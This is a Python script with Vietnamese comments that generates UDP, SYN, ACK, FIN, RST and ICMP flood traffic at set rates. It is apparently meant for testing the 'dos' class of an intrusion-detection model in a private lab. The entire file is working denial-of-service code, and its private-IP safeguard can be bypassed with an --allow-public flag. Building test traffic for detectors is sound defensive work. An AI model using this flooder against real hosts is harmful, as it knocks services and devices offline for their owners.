#!/usr/bin/env python
"""Sinh traffic flood (DoS) để kiểm thử lớp 'dos' của model IDS trong lab.

- udp: dùng socket thường, rất nhanh (vài chục nghìn goi/giay), KHONG can admin. Đây là cách test
  lớp 'dos' đáng tin nhất trên Windows.
- syn/ack/fin/rst/icmp: dựng gói thô bằng scapy + Npcap, CAN admin ("Run as administrator"). Trên
  Windows scapy bắn chậm (vài chục goi/giay), thường KHONG du nhanh de ra 'dos' — muốn flood SYN tốc
  độ cao, dùng hping3 trong WSL (xem README).

CẢNH BÁO: flood có thể làm thiết bị yếu (camera, IoT) treo hoặc khởi động lại. Chỉ nhắm thiết bị bạn
được phép test. Bắt đầu tốc độ thấp, thời gian ngắn.

Cách dùng:
  python dos_flood.py 192.168.1.27 --type udp --port 53 --rate 8000 --duration 12
  python dos_flood.py 192.168.1.27 --type syn --port 80 --rate 2000 --duration 12
"""
import argparse
import ipaddress
import random
import socket
import sys
import time

DEFAULT_SRC = "192.168.1.186"
VARIANTS = 256


def is_lab(ip, allow_public):
    try:
        return allow_public or ipaddress.ip_address(ip).is_private
    except ValueError:
        return False


def pace(send_batch, rate, duration):
    """Gọi send_batch(n) đều đặn để đạt khoảng `rate` goi/giay trong `duration` giây. Trả về số gói đã gửi."""
    batch = max(1, rate // 200)
    interval = batch / rate
    start = time.time()
    end = start + duration
    schedule = start
    last_report = start
    sent = 0
    try:
        while time.time() < end:
            send_batch(batch)
            sent += batch
            schedule += interval
            delay = schedule - time.time()
            if delay > 0:
                time.sleep(delay)
            now = time.time()
            if now - last_report >= 3:
                print(f"  da gui {sent} goi, {sent / (now - start):.0f} goi/giay")
                last_report = now
    except KeyboardInterrupt:
        print("Dung theo yeu cau.")
    elapsed = time.time() - start
    print(f"Xong: {sent} goi trong {elapsed:.1f}s ({sent / max(elapsed, 1e-6):.0f} goi/giay).")
    return sent


def flood_udp(target, port, rate, duration, src):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    # Máy có nhiều card cùng dải: ép đi ra đúng card nguồn (mặc định card dây .186), không để OS chọn Wi-Fi.
    try:
        sock.bind((src, 0))
        print(f"Dang gui tu {src}")
    except OSError:
        print(f"Khong bind duoc {src}, de OS tu chon card. Kiem tra router xem goi mang IP nao.")
    # Socket chặn (blocking): sendto chờ khi bộ đệm đầy thay vì bỏ gói, nên gói ra đều và đủ.
    # Dùng tải lớn hơn (~512 B) để flood có khối lượng byte đáng kể, giống hping3.
    payload = b"\x00" * 512
    address = (target, port)
    failed = [0]

    def send_batch(n):
        for _ in range(n):
            try:
                sock.sendto(payload, address)
            except OSError:
                failed[0] += 1  # ví dụ ENOBUFS khi NIC nghẽn; đếm để báo, không bỏ qua âm thầm

    print(f"Flood UDP -> {target}:{port} | muc tieu {rate} goi/giay, {duration}s, goi {len(payload) + 42} B. Ctrl+C de dung.")
    sent = pace(send_batch, rate, duration)
    if failed[0]:
        print(f"Canh bao: {failed[0]} goi gui that bai (NIC nghen). Giam --rate neu nhieu.")
    sock.close()
    return sent


def flood_scapy(flood, target, port, rate, duration, src):
    import scapy.all as scapy
    from scapy.all import ARP, ICMP, IP, TCP, UDP, Ether

    iface = next((i for i in scapy.get_working_ifaces() if getattr(i, "ip", None) == src), None)
    if iface is None:
        print(f"Khong tim thay card co IP {src}.")
        return 0
    print(f"Phan giai MAC cua {target} qua {iface.name} ({src})...")
    answer = scapy.srp1(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=target, psrc=src),
                        iface=iface, timeout=3, verbose=False)
    if answer is None:
        print(f"Khong phan giai duoc MAC cua {target}: may co the tat. Ping mot cai cho no day roi chay lai.")
        return 0
    mac_dst, mac_src = answer.hwsrc, iface.mac
    flags = {"syn": "S", "ack": "A", "fin": "F", "rst": "R"}
    frames = []
    for _ in range(VARIANTS):
        sport = random.randint(1025, 65000)
        ether = Ether(src=mac_src, dst=mac_dst)
        if flood in flags:
            packet = ether / IP(src=src, dst=target) / TCP(sport=sport, dport=port, flags=flags[flood])
        elif flood == "icmp":
            packet = ether / IP(src=src, dst=target) / ICMP() / (b"\x00" * 16)
        else:
            packet = ether / IP(src=src, dst=target) / UDP(sport=sport, dport=port) / (b"\x00" * 16)
        frames.append(bytes(packet))
    sock = scapy.conf.L2socket(iface=iface)
    counter = [0]

    def send_batch(n):
        for _ in range(n):
            sock.send(frames[counter[0] % VARIANTS])
            counter[0] += 1

    print(f"Flood {flood.upper()} -> {target}:{port} tu {src} | muc tieu {rate} goi/giay, {duration}s (scapy cham tren Windows).")
    sent = pace(send_batch, rate, duration)
    sock.close()
    return sent


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("target")
    parser.add_argument("--type", choices=["udp", "syn", "ack", "fin", "rst", "icmp"], default="udp")
    parser.add_argument("--port", type=int, default=53)
    parser.add_argument("--rate", type=int, default=8000, help="goi moi giay muc tieu")
    parser.add_argument("--duration", type=float, default=12, help="so giay")
    parser.add_argument("--src", default=DEFAULT_SRC, help="IP nguon (chi dung cho scapy)")
    parser.add_argument("--allow-public", action="store_true")
    args = parser.parse_args()
    sys.stdout.reconfigure(encoding="utf-8")

    if not is_lab(args.target, args.allow_public):
        print(f"Tu choi: {args.target} khong phai IP lab (dai rieng).")
        return 2

    if args.type == "udp":
        flood_udp(args.target, args.port, args.rate, args.duration, args.src)
    else:
        flood_scapy(args.type, args.target, args.port, args.rate, args.duration, args.src)
    return 0


if __name__ == "__main__":
    sys.exit(main())
